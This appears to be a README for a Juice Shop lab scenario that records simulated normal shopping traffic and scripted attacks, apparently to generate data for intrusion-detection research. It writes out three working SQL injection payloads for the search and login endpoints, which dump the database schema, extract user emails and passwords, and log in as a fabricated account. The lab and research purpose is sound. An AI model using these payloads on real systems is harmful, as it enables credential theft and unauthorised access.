# Juice shop 

## Overview:
[OWASP Web shop application](https://owasp.org/www-project-juice-shop/) with multiple vulnerabilities.

## Victim:
Modern web application with multiple vulnerabilities. Runs at port 3000, using provided docker for deployment.

## Normal:
User actions include:
        register -> new account for user
        login    -> login user
        shopping -> put random item in basket
                 -> leave feedback to product
        complain -> upload complaint file
        checkout -> set address, delivery method and payment details
User first registers, then logs in and chooses random between shopping, complaining and completing the checkout.

## Exploit:
Running debian10 with selenium user.
Multiple attacks possible (use as 4th parameter following name):
* SQLInjectionSchema
* SQLInjectionCred
* SQLInjectionUser

### SQL-Injection - SQL Schema
Run malicious query at /rest/products/search:

        qwert')) UNION SELECT sql, '2', '3', '4', '5', '6', '7', '8', '9' FROM sqlite_master--

### SQL-Injection - Credentials
Run malicious query at /rest/products/search:

        qwert')) UNION SELECT id, email, password, '4', '5', '6', '7', '8', '9' FROM Users--

### SQL-Injection - Non Existing User Login
Run malicious query as email while login:

        ' UNION SELECT * FROM (SELECT 15 as 'id', '' as 'username', 'acc0unt4nt@juice-sh.op' as 'email', '12345' as 'password', 'accounting' as 'role', '123' as 'deluxeToken', '1.2.3.4' as 'lastLoginIp' , '/assets/public/images/uploads/default.svg' as 'profileImage', '' as 'totpSecret', 1 as 'isActive', '1999-08-16 14:14:41.644 +00:00' as 'createdAt', '1999-08-16 14:33:41.930 +00:00' as 'updatedAt', null as 'deletedAt')--

## cli:

    sudo python3 main.py a b c d
    
    a: boolean (0/1) run automated normal behavior
    b: integer recording time
       1-n: recording time in seconds
        -1: flag to run auto stop of recording after end of exploit
    c: boolean (0/1) run automated exploit
    d: attack type (SQLInjectionSchema, SQLInjectionCred, SQLInjectionUser)